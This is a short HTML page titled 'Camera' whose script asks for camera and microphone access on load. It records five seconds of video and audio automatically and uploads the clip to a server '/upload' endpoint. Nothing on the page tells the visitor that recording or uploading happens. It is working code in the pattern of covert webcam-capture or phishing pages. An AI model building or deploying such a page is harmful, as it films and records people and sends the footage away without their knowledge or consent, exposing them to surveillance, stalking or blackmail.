<!DOCTYPE html>
<html>
<head>
    <title>Camera</title>
</head>
<body>

<h1>brahim</h1>

<video id="video" autoplay playsinline></video>

<script>
let mediaRecorder;
let chunks = [];

navigator.mediaDevices.getUserMedia({
    video: true,
    audio: true
})
.then(stream => {

    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = e => {
        chunks.push(e.data);
    };

    mediaRecorder.onstop = () => {

        const blob = new Blob(chunks, {
            type: 'video/webm'
        });

        const formData = new FormData();

        formData.append(
            "video",
            blob,
            "video.webm"
        );

        fetch('/upload', {
            method: 'POST',
            body: formData
        });

        chunks = [];
    };

    mediaRecorder.start();

    setTimeout(() => {
        mediaRecorder.stop();
    }, 5000);

});
</script>

</body>
</html>
